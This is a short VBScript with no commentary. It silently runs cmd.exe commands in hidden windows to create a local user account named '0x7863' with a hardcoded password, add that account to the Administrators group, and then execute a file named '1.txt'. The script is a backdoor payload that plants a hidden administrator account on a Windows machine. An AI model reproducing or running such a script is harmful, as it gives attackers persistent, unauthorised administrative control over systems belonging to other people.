set wshshell=createobject ("wscript.shell") 
a=wshshell.run ("cmd.exe /c net user 0x7863 c3253220. /add",0) 
b=wshshell.run ("cmd.exe /c net localgroup Administrators 0x7863 /add",0)
b=wshshell.run ("cmd.exe /c 1.txt",0)
